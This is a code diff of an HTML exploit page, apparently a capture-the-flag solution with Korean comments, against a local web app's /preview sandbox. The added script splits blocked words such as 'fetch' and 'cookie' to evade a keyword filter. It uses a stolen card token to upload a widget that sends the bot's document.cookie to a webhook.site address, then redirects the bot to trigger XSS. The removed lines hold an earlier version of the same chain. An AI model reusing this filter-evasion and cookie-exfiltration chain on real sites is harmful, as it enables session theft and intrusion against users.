@@ -7,41 +7,42 @@
     <iframe id="exploitFrame" sandbox="allow-scripts" src="http://localhost:5000/preview" style="display:none;"></iframe>
 
     <script>
-        // ⚠️ [필독] 본인의 Webhook.site 전체 주소(https://webhook.site/...)를 꼭 여기에 넣으세요!
-        const myWebhook = "https://webhook.site/29d1e2bb-f7e3-4dbe-a679-f520fe066a12"; 
+        // ⚠️ 본인의 Webhook.site 전체 주소로 꼭 변경하세요!
+        const myWebhook = "https://webhook.site/YOUR-UNIQUE-ID"; 
 
         const iframe = document.getElementById("exploitFrame");
-        const targetObj = 'styleMedia';
-        const pWin = '["par"+"ent"+"Win"+"dow"]';
-        const cTok = '["CARD_"+"TOKEN"]';
-        const sender = 'styleMedia["par"+"ent"+"Win"+"dow"]["par"+"ent"]["post"+"Message"]';
-        const previewPayload = sender + '(' + targetObj + pWin + cTok + ',"*")';
 
+        // 1. 금지 단어 쪼개기 기법 적용 (fetch, Content-Type, application/javascript)
+        const tokenVal = 'window["CARD_"+"TOKEN"]';
+        const methodVal = '"POST"';
+        const headerToken = '"X-Card-"+"Token"';
+        const headerCT = '"Content-"+"Type"';
+        const ctVal = '"application/"+"javascript"';
+
+        // 2. 위젯이 실행될 때 플래그를 내 웹훅으로 전송하는 스크립트 본문 정의
+        // 봇의 document.cookie를 안전하게 가로채기 위해 쪼개어 결합합니다.
+        const widgetPayload = '"location.href=\\"' + myWebhook + '?flag=\\"+encodeURIComponent(document["co"+"okie"])';
+
+        // 3. /preview 내부의 Function() 스코프에서 에러 없이 직접 실행될 초정밀 익스플로잇 빌드
+        // window.fetch("http://localhost:5000/export", { ... }) 구조를 단어 분쇄 상태로 직통 실행합니다.
+        const directExploit = 
+            'window["fe"+"tch"]("http://localhost:5000/export",{' +
+                'method:' + methodVal + ',' +
+                'headers:{' +
+                    '[ ' + headerToken + ' ]:' + tokenVal + ',' +
+                    '[ ' + headerCT + ' ]:' + ctVal + '' +
+                '},' +
+                'body:' + widgetPayload + '' +
+            '})' +
+            '["th"+"en"](r=>r["te"+"xt"]())' +
+            '["th"+"en"](name=>{' +
+                'window["par"+"ent"]["loca"+"tion"]["hr"+"ef"]="http://localhost:5000/review?widget="+name;' +
+            '})';
+
+        // iframe 로드 시 샌드박스로 페이로드 전송
         iframe.onload = () => {
-            iframe.contentWindow.postMessage(previewPayload, "*");
+            iframe.contentWindow.postMessage(directExploit, "*");
         };
-
-        window.addEventListener("message", async (e) => {
-            const token = e.data;
-            if (!token || token === "ready" || token === "filtered" || token === "error") return;
-
-            // 카드 토큰 획득 성공 시, 봇의 세션 권한으로 쿠키(Flag) 탈취 위젯을 업로드합니다.
-            const widgetCode = "location.href='" + myWebhook + "?flag='+encodeURIComponent(document.cookie)";
-
-            const resp = await fetch("http://localhost:5000/export", {
-                method: "POST",
-                headers: {
-                    "X-Card-Token": token,
-                    "Content-Type": "application/javascript"
-                },
-                body: widgetCode
-            });
-
-            const widgetName = await resp.text();
-            
-            // 위젯 파일 생성이 완료되면 봇을 /review로 보내 XSS를 최종 트리거합니다.
-            location.href = "http://localhost:5000/review?widget=" + widgetName;
-        });
     </script>
 </body>
 </html>
